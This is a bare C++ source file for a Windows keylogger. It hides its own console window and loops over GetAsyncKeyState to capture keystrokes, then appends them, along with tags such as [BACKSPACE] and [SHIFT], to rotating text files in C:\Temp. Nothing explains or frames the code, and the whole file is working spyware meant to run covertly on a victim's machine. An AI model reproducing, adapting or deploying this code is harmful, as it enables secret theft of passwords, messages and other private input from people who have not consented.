#include <iostream>
#include <windows.h>
#include <winuser.h>   
#include<string.h>
#include<stdlib.h>
using namespace std;
int Save(int key_stroke, char *file);
void Stealth();

void file_name(char *old, int cnt)
{
	int i;
	char *txt = ".txt";
	char file_num[2] = "a";
	char *p;
	p = &file_num[0];
	for (i = 0; i < cnt; i++)
	{
		(*p)++;
	}
	strcat(old, file_num);
	strcat(old, txt);
}
int j = 0;
int main()
{

	char i;
	int cnt = 0;
	char oldstr[500] = "C:\\Temp\\a";
	Stealth();

	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767) {
				if (cnt > 26)
					cnt = 0;
				file_name(oldstr, cnt);
				Save(i, oldstr);

				if (j >= 30) {
					cnt++;
					j = 0;
				}
				else
					j++;
				strcpy(oldstr, "C:\\Temp\\a");
			}
		}

	}
	system("PAUSE");
	return 0;
}
int Save(int key_stroke, char *file)
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout << key_stroke << endl;

	if (key_stroke == 8)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	fclose(OUTPUT_FILE);
	return 0;
}
void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}